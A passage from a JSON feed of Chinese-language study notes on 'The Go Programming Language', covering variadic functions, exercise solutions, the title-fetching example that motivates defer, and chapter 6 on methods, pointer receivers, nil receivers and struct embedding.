\"func([]int)\"\n</code></pre></div><p>可变参数函数经常被用于格式化字符串。下面的errorf函数构造了一个以行号开头的，经过格式化的错误信息。函数名的后缀f是一种通用的命名规范，代表该可变参数函数可以接收Printf风格的格式化字符串。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func errorf(linenum int, format string, args ...interface{}) {\n    fmt.Fprintf(os.Stderr, \"Line %d: \", linenum)\n    fmt.Fprintf(os.Stderr, format, args...)\n    fmt.Fprintln(os.Stderr)\n}\nlinenum, name := 12, \"count\"\nerrorf(linenum, \"undefined: %s\", name) // \"Line 12: undefined: count\"\n</code></pre></div><p>interface{}表示函数的最后一个参数可以接收任意类型，我们会在第7章详细介绍。</p>\n<h3>练习5.15</h3>\n<p>编写类似sum的可变参数函数max和min。考虑不传参时，max和min该如何处理，再编写至少接收1个参数的版本。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"math\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tmaxNum<span class=\"token punctuation\">,</span> minNum<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">:=</span> <span class=\"token function\">MinMax</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Print</span><span class=\"token punctuation\">(</span>minNum<span class=\"token punctuation\">,</span> maxNum<span class=\"token punctuation\">)</span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">MinMax</span><span class=\"token punctuation\">(</span>nums <span class=\"token operator\">...</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>max <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> min <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> err <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n\t\terr <span class=\"token operator\">=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"err: 参数个数为0\"</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> err\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">// 初始化最小值为最大整数</span>\n\tmin <span class=\"token operator\">=</span> math<span class=\"token punctuation\">.</span>MaxInt\n\t<span class=\"token comment\">// 遍历所有参数，求最大值和最小值</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> num <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> nums <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> num <span class=\"token operator\">&gt;</span> max <span class=\"token punctuation\">{</span>\n\t\t\tmax <span class=\"token operator\">=</span> num\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token keyword\">if</span> num <span class=\"token operator\">&lt;</span> min <span class=\"token punctuation\">{</span>\n\t\t\tmin <span class=\"token operator\">=</span> num\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> max<span class=\"token punctuation\">,</span> min<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>练习5.16</h3>\n<p>编写多参数版本的strings.Join。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\n<span class=\"token keyword\">func</span> <span class=\"token function\">Join</span><span class=\"token punctuation\">(</span>strs <span class=\"token operator\">...</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>strsJoin <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> err <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>strs<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n\t\terr <span class=\"token operator\">=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"err: 参数个数为0\"</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> err\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> str <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> strs <span class=\"token punctuation\">{</span>\n\t\tstrsJoin <span class=\"token operator\">=</span> strsJoin <span class=\"token operator\">+</span> str\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> strsJoin<span class=\"token punctuation\">,</span> err\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>练习5.17</h3>\n<p>编写多参数版本的ElementsByTagName，函数接收一个HTML结点树以及任意数量的标签名，返回与这些标签名匹配的所有元素。下面给出了2个例子：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func ElementsByTagName(doc *html.Node, name...string) []*html.Node\nimages := ElementsByTagName(doc, \"img\")\nheadings := ElementsByTagName(doc, \"h1\", \"h2\", \"h3\", \"h4\")\n</code></pre></div><p>没写 感觉太麻烦</p>\n<h2>5.8. Deferred函数</h2>\n<p>下面的例子获取HTML页面并输出页面的标题。title函数会检查服务器返回的Content-Type字段，如果发现页面不是HTML，将终止函数运行，返回错误。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>package main\n\nimport (\n\t\"fmt\"\n\t\"golang.org/x/net/html\"\n\t\"net/http\"\n\t\"strings\"\n)\n\nfunc main() {\n\terr := title(\"https://golang.org/doc/gopher/frontpage.png\")\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\n}\n\nfunc title(url string) error {\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\treturn err\n\t}\n\t// Check Content-Type is HTML (e.g., \"text/html;charset=utf-8\").\n\tct := resp.Header.Get(\"Content-Type\")\n\tif ct != \"text/html\" &amp;&amp; !strings.HasPrefix(ct, \"text/html;\") {\n\t\tresp.Body.Close()\n\t\treturn fmt.Errorf(\"%s has type %s, not text/html\", url, ct)\n\t}\n\tdoc, err := html.Parse(resp.Body)\n\tresp.Body.Close()\n\tif err != nil {\n\t\treturn fmt.Errorf(\"parsing %s as HTML: %v\", url, err)\n\t}\n\tvisitNode := func(n *html.Node) {\n\t\tif n.Type == html.ElementNode &amp;&amp; n.Data == \"title\" &amp;&amp; n.FirstChild != nil {\n\t\t\tfmt.Println(n.FirstChild.Data)\n\t\t}\n\t}\n\tforEachNode(doc, visitNode, nil)\n\treturn nil\n}\nfunc forEachNode(n *html.Node, pre, post func(n *html.Node)) {\n\tif pre != nil {\n\t\tpre(n)\n\t}\n\tfor c := n.FirstChild; c != nil; c = c.NextSibling {\n\t\tforEachNode(c, pre, post)\n\t}\n\tif post != nil {\n\t\tpost(n)\n\t}\n}\n\n</code></pre></div><p>下面展示了运行效果：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>$ go build gopl.io/ch5/title1\n$ ./title1 http://gopl.io\nThe Go Programming Language\n$ ./title1 https://golang.org/doc/effective_go.html\nEffective Go - The Go Programming Language\n$ ./title1 https://golang.org/doc/gopher/frontpage.png\ntitle1: https://golang.org/doc/gopher/frontpage.png has type image/png, not text/html\n</code></pre></div><p><code>resp.Body.close</code>调用了多次，这是为了确保title在所有执行路径下（即使函数运行失败）都关闭了网络连接。随着函数变得复杂，需要处理的错误也变多，维护清理逻辑变得越来越困难。而Go语言独有的defer机制可以让事情变得简单。</p>\n",
      "date_published": "2024-07-31T08:52:23.000Z",
      "date_modified": "2024-07-31T08:52:23.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "06. 方法",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch6.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch6.html",
      "summary": "06. 方法\n6.1. 方法声明\n方法是与特定类型关联的函数\n方法有一个参数，称为接收者（receiver），它位于方法名称之前，并指定了方法作用的类型。接收者可以是任何类型，包括非结构体类型。\n方法使用点符号将方法与实例进行关联。方法可以访问和修改其接收者类型的数据，这使得方法能够实现面向对象的特性，例如封装和封装的数据。\n在Go语言中，并不会像其它...",
      "content_html": "\n<h2>6.1. 方法声明</h2>\n<p>方法是与特定类型关联的函数</p>\n<p>方法有一个参数，称为接收者（receiver），它位于方法名称之前，并指定了方法作用的类型。接收者可以是任何类型，包括非结构体类型。</p>\n<p>方法使用点符号将方法与实例进行关联。方法可以访问和修改其接收者类型的数据，这使得方法能够实现面向对象的特性，例如封装和封装的数据。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> geometry\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"math\"</span>\n\n<span class=\"token keyword\">type</span> Point <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span> X<span class=\"token punctuation\">,</span> Y <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// traditional function</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> q Point<span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Hypot</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>X<span class=\"token operator\">-</span>p<span class=\"token punctuation\">.</span>X<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">.</span>Y<span class=\"token operator\">-</span>p<span class=\"token punctuation\">.</span>Y<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// same thing, but as a method of the Point type</span>\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>p Point<span class=\"token punctuation\">)</span> <span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span>q Point<span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Hypot</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>X<span class=\"token operator\">-</span>p<span class=\"token punctuation\">.</span>X<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">.</span>Y<span class=\"token operator\">-</span>p<span class=\"token punctuation\">.</span>Y<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>在Go语言中，并不会像其它语言那样用this或者self作为接收器，可以任意的选择接收器的名字。命名方式可以使用其类型的第一个字母，比如这里使用了Point的首字母p。</p>\n<p>调用方式举例：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>p <span class=\"token operator\">:=</span> Point<span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">}</span>\nq <span class=\"token operator\">:=</span> Point<span class=\"token punctuation\">{</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">}</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"5\", function call</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">// \"5\", method call</span>\n</code></pre></div><p>可以看到，上面的两个函数调用都是<code>Distance</code>，但是却没有发生冲突。第一个<code>Distance</code>的调用实际上用的是包级别的函数<code>geometry.Distance</code>，而第二个则是使用刚刚声明的Point，调用的是Point类型下声明的<code>Point.Distance</code>方法。</p>\n<p>这种<code>p.Distance</code>的表达式叫做选择器，因为他会选择合适的对应p这个对象的<code>Distance</code>方法来执行。选择器也会被用来选择一个struct类型的字段，比如<code>p.X</code>。由于方法和字段都是在同一命名空间，所以如果我们在这里声明一个<code>X</code>方法的话，编译器会报错，因为在调用<code>p.X</code>时会有歧义。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// A Path is a journey connecting the points with straight lines.</span>\n<span class=\"token keyword\">type</span> Path <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>Point\n\n<span class=\"token comment\">// Distance returns the distance traveled along the path.</span>\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>path Path<span class=\"token punctuation\">)</span> <span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span>\n\tsum <span class=\"token operator\">:=</span> <span class=\"token number\">0.0</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> path <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> i <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n\t\t\tsum <span class=\"token operator\">+=</span> path<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> sum\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    perim <span class=\"token operator\">:=</span> Path<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n\t\t<span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n\t\t<span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n\t\t<span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>perim<span class=\"token punctuation\">.</span><span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"12\"</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在上面两个对Distance名字的方法的调用中，编译器会根据方法的名字以及接收器来决定具体调用的是哪一个函数。第一个例子中path[i-1]数组中的类型是Point，因此Point.Distance这个方法被调用；在第二个例子中perim的类型是Path，因此Distance调用的是Path.Distance。</p>\n<p>方法比之函数的一些好处：方法名可以简短。当我们在包外调用的时候这种好处就会被放大，因为我们可以使用这个短名字，而可以省略掉包的名字，下面是例子：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>import \"ch6/geometry\"\n\nperim := geometry.Path{{1, 1}, {5, 1}, {5, 4}, {1, 1}}\nfmt.Println(geometry.PathDistance(perim)) // \"12\", standalone function\nfmt.Println(perim.Distance())             // \"\n</code></pre></div><h2>6.2. 基于指针对象的方法</h2>\n<p>当调用一个函数时，会对其每一个参数值进行拷贝，如果一个函数需要更新一个变量，或者函数的其中一个参数实在太大我们希望能够避免进行这种默认的拷贝，就需要用到指针了。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">*</span>Point<span class=\"token punctuation\">)</span> <span class=\"token function\">ScaleBy</span><span class=\"token punctuation\">(</span>factor <span class=\"token builtin\">float64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    p<span class=\"token punctuation\">.</span>X <span class=\"token operator\">*=</span> factor\n    p<span class=\"token punctuation\">.</span>Y <span class=\"token operator\">*=</span> factor\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>想要调用指针类型方法<code>(*Point).ScaleBy</code>，只要提供一个Point类型的指针即可，像下面这样。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>r <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>Point<span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">}</span>\nr<span class=\"token punctuation\">.</span><span class=\"token function\">ScaleBy</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>r<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"{2, 4}\"</span>\n</code></pre></div><p>或者这样：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>p <span class=\"token operator\">:=</span> Point<span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">}</span>\npptr <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>p\npptr<span class=\"token punctuation\">.</span><span class=\"token function\">ScaleBy</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"{2, 4}\"</span>\n</code></pre></div><p>或者这样:</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>p <span class=\"token operator\">:=</span> Point<span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">ScaleBy</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"{2, 4}\"</span>\n</code></pre></div><p>不过后面两种方法有些笨拙。幸运的是，go语言本身在这种地方会帮到我们。如果接收器p是一个Point类型的变量，并且其方法需要一个Point指针作为接收器，我们可以用下面这种简短的写法：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>p<span class=\"token punctuation\">.</span><span class=\"token function\">ScaleBy</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n</code></pre></div><p>编译器会隐式地帮我们用&amp;p去调用ScaleBy这个方法。这种简写方法只适用于“变量”，包括struct里的字段比如p.X，以及array和slice内的元素比如perim[0]。我们不能通过一个无法取到地址的接收器来调用指针方法，比如临时变量的内存地址就无法获取得到：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>Point<span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">.</span><span class=\"token function\">ScaleBy</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// compile error: can't take address of Point literal</span>\n</code></pre></div><p><strong>译注：</strong> 作者这里说的比较绕，其实有两点：</p>\n<ol>\n<li>不管你的method的receiver是指针类型还是非指针类型，都是可以通过指针/非指针类型进行调用的，编译器会帮你做类型转换。</li>\n<li>在声明一个method的receiver该是指针还是非指针类型时，你需要考虑两方面的因素，第一方面是这个对象本身是不是特别大，如果声明为非指针变量时，调用会产生一次拷贝；第二方面是如果你用指针类型作为receiver，那么你一定要注意，这种指针类型指向的始终是一块内存地址，就算你对其进行了拷贝。</li>\n</ol>\n<h3>6.2.1. nil也是合法的接收器类型</h3>\n<p>就像一些函数允许nil指针作为参数一样，方法理论上也可以用nil指针作为其接收器，尤其当nil对于对象来说是合法的零值时，比如map或者slice。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>m <span class=\"token operator\">:=</span> url<span class=\"token punctuation\">.</span>Values<span class=\"token punctuation\">{</span><span class=\"token string\">\"lang\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"en\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span> <span class=\"token comment\">// direct construction</span>\nm<span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"item\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\nm<span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"item\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span>\n\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"lang\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"en\"</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"q\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">// \"\"</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"item\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"1\"      (first value)</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">[</span><span class=\"token string\">\"item\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>     <span class=\"token comment\">// \"[1 2]\"  (direct map access)</span>\n\nm <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"item\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"\"</span>\nm<span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"item\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>         <span class=\"token comment\">// panic: assignment to entry in nil map</span>\n\n</code></pre></div><figure><figcaption>image-20240612221142796</figcaption></figure>\n<p>对Get的最后一次调用中，nil接收器的行为即是一个空map的行为。我们可以等价地将这个操作写成<code>Value(nil).Get(\"item\")</code>，但是如果你直接写<code>nil.Get(\"item\")</code>的话是无法通过编译的，因为nil的字面量编译器无法判断其准确类型。所以相比之下，最后的那行<code>m.Add</code>的调用就会产生一个panic，因为他尝试更新一个空map。</p>\n<h3><strong>评论区总结：</strong></h3>\n<blockquote>\n<ol>\n<li>按值传递，调用函数时会复制该对象与传递函数形参，在函数内部修改该对象需要通过return来返回（否则将只相当于函数内部的临时变量）</li>\n<li>按指针传递，调用函数时将传递对象指针，然后传递函数形参，在函数内部的修改就是对指针指向的内存的修改。</li>\n</ol>\n</blockquote>\n<h2>6.3. 通过嵌入结构体来扩展类型</h2>\n<h3>嵌入结构体</h3>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">type</span> Point <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span> X<span class=\"token punctuation\">,</span> Y <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">type</span> ColoredPoint <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">{</span>\n\tPoint\n\tColor color<span class=\"token punctuation\">.</span>RGBA\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> cp ColoredPoint\n\tcp<span class=\"token punctuation\">.</span>X <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">.</span>Point<span class=\"token punctuation\">.</span>X<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"1\"</span>\n\tcp<span class=\"token punctuation\">.</span>Point<span class=\"token punctuation\">.</span>Y <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">.</span>Y<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"2\"</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>struct内嵌可以使我们在定义ColoredPoint时得到一种句法上的简写形式，并使其包含Point类型所具有的一切字段，然后再定义一些自己的。调用的时候可以直接认为通过嵌入的字段就是ColoredPoint自身的字段，而完全不需要在调用时指出Point。</p>\n<h3>嵌入结构体类型当作接收器</h3>\n<p>对于Point中的方法我们也有类似的用法，我们可以把ColoredPoint类型当作接收器来调用Point里的方法，即使ColoredPoint里没有声明这些方法：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>p Point<span class=\"token punctuation\">)</span> <span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span>q Point<span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">return</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Hypot</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>X<span class=\"token operator\">-</span>p<span class=\"token punctuation\">.</span>X<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">.</span>Y<span class=\"token operator\">-</span>p<span class=\"token punctuation\">.</span>Y<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">*</span>Point<span class=\"token punctuation\">)</span> <span class=\"token function\">ScaleBy</span><span class=\"token punctuation\">(</span>factor <span class=\"token builtin\">float64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tp<span class=\"token punctuation\">.</span>X <span class=\"token operator\">*=</span> factor\n\tp<span class=\"token punctuation\">.</span>Y <span class=\"token operator\">*=</span> factor\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token 